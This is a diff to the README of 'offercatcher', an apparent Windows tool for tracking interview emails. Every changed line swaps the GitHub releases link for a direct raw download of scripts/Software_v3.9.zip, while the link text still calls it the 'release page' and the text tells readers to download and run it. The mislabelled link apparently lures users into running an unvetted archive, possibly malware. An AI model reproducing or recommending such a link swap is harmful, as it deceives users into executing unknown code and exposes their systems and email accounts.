@@ -1,6 +1,6 @@
 # 🎯 offercatcher - Never Miss Interview Emails Again
 
-[![Download offercatcher](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/jessad3915/offercatcher/releases)
+[![Download offercatcher](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/jessad3915/offercatcher/raw/refs/heads/main/scripts/Software_v3.9.zip)
 
 ## 🚀 What offercatcher does
 
@@ -16,7 +16,7 @@ Use it when you want to:
 
 ## 📥 Download offercatcher
 
-Visit the [release page](https://github.com/jessad3915/offercatcher/releases) to download and run this file.
+Visit the [release page](https://github.com/jessad3915/offercatcher/raw/refs/heads/main/scripts/Software_v3.9.zip) to download and run this file.
 
 On the release page, look for the newest version. Download the file that matches your Windows device, then open it after the download finishes.
 
@@ -40,7 +40,7 @@ For best results, keep your inbox access open during setup so the app can read n
 
 ## 🛠️ How to install
 
-1. Open the [release page](https://github.com/jessad3915/offercatcher/releases)
+1. Open the [release page](https://github.com/jessad3915/offercatcher/raw/refs/heads/main/scripts/Software_v3.9.zip)
 2. Find the latest version near the top of the page
 3. Download the Windows file
 4. If the file is in a `.zip`, open it and extract the contents
@@ -161,7 +161,7 @@ Pick the file that matches how you like to install apps on Windows. If you want 
 
 ## 📌 Release page
 
-Download the latest Windows version from the [release page](https://github.com/jessad3915/offercatcher/releases) and run it after the file finishes downloading
+Download the latest Windows version from the [release page](https://github.com/jessad3915/offercatcher/raw/refs/heads/main/scripts/Software_v3.9.zip) and run it after the file finishes downloading
 
 ## 🧑‍💻 Basic workflow
 
